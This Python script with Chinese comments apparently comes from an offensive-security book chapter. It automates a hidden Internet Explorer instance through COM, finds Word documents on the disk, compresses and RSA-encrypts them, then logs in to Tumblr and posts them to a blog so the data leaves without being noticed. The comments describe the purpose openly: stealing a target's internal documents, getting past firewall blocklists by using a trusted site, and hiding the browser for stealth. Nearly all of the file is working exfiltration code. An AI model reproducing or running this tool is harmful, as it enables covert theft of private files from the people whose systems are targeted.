# -*- coding:utf8 -*-
# 利用IE的COM组件自动化技术窃取数据
# 获取进入目标网络的权限只是整个网络攻防中的一部分，接下来我们将利用该权限窃取目标系统的内部文档
# 和电子表格或者其他数据。由于目标的防护机制各不相同，这个部分将是最考验攻防技术的内容。我们可能
# 遇到的是本地或者远程的系统(或者两者都有).需要开启一个实现远程连接的进程.这个进程必须能够从内部
# 发送数据或者初始化一个连接到外部.
# IE浏览器的COM组件自动化技术在利用浏览器进程Iexplore.exe方面具有很大优势。该进程默认为可被信任
# 及作为防火墙白名单的成员(现在不知道是不是了，毕竟这本书出了几年了)，我们可以利用它窃取网络的内部信息

"""
    该Python脚本:用于捕获本地文件系统的Word文档。当一个文档出现时，脚本将利用公钥对其加密，然后
    启动进程将加密的文档提交到一个位于tumblr.com站点的博客上。这样的话我们就可以秘密地传送文档,
    并且在任何人都无法解密的情况下恢复文档。通过利用诸如Tumblr这样的信任站点，我们还能够穿透防火墙
    或者代理的·黑名单拦截功能，这些功能很可能阻止我们将文档发送到一个被我所控的IP地址或者Web服务器,

"""

import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = ""
password = ""

public_key = ""


def wait_for_browser(browser):
    # 等待浏览器加载完一个页面
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


def encrypt_string(plaintext):
    # 设置块大小
    chunk_size = 256
    print("Compressing: %d bytes" % len(plaintext))
    # 首先调用zlib进行压缩
    plaintext = zlib.compress(plaintext)

    print("Encrypting %d bytes" % len(plaintext))

    # 利用公钥建立RSA公钥加密对象
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset = 0

    # 对文件内容进行每256个字节为一块循环加密(RSA加密数据块的最大值.)
    while offset < len(plaintext):
        # 获取某个256字节
        chunk = plaintext[offset:offset + chunk_size]
        # 若到最后不够256字节，则用空格补够
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
        # 将已加密的连起来
        encrypted += rsakey.encrypt(chunk)
        # 偏移增加
        offset += chunk_size
    # 对加密后的进行base64编码(为避免提交到Tumblr博客上时出现编码之类的怪异问题)
    encrypted = encrypted.encode("base64")
    # 输出最后加密后的长度
    print("Base64 encoded crypto: %d" % len(encrypted))
    # 返回加密后内容
    return encrypted


def encrypt_post(filename):
    # 打开并读取文件
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()
    # 分别加密文件名和内容
    encrypt_title = encrypt_string(filename)
    encrypt_body = encrypt_string(contents)

    return encrypt_title, encrypt_body


# 建立好了加密函数,接下来将添加登录和浏览Tumblr界面的功能。不幸的是，目前还没有查找Web界面上的UI
# 元素的捷径，需要使用浏览器开发工具检查每个需要交互的HTML元素.
# 可以通过Tumblr的设置页面将编辑模式调整为纯文本模式，关闭讨厌的基于JavaScript的编辑模式。
# 此外，如果你使用的不是Tumblr而是其他服务，你需要解决精切的时间计算，DOM对象交互，以及所需的HTML
# 元素的获取问题，幸运的是，Python使得这些步骤自动化协调起来非常简单.

# 随机休眠一段时间
def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumblr(ie):
    # 解析文档中的所有元素
    full_doc = ie.Document.all
    # 迭代每个元素来查找登陆表单
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    try:
        # 会遇到不同的登陆主页
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError:
        pass

    random_sleep()

    # 登陆表单是登陆页面的第二个表单
    wait_for_browser(ie)
    return


def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
        elif i.id == "create_post":
            print("Found post button")
            post_form = i
            i.focus()

    # 将浏览器的焦点从输入主体内容的窗口上移开.
    # (将浏览器的焦点从需要提交主体内容的部分移开，才能使Tumblr上的JavaScript代码启用Post按钮)
    random_sleep()
    title_box.focus()
    random_sleep()

    post_form.childran[0].click()
    wait_for_browser(ie)

    random_sleep()

    return


def exfiltrate(document_path):
    # 创建IE实例化对象
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    # 调试阶段设置为1，实际设置为0，以增加隐蔽性
    # 利用隐藏的IE进程进行文档窃取的活动将会更深地隐藏在用户的正常活动中
    ie.Visible = 1

    # 访问tumblr站点并登陆
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print("Logging in ...")
    login_to_tumblr(ie)
    print("Logged in ... navigating")

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # 加密文件
    title, body = encrypt_post(document_path)

    print("Creating new post...")
    post_to_tumblr(ie, title, body)
    print("Posted!")

    # 销毁IE实例
    ie.Quit()
    ie = None


# 用户文档检索的主循环,搜索用户的C磁盘,找到对应的文件
for parent, directories, filenames in os.walk("C:\\test\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print("Found: %s" % document_path)
        exfiltrate(document_path)
        raw_input("Continue?")
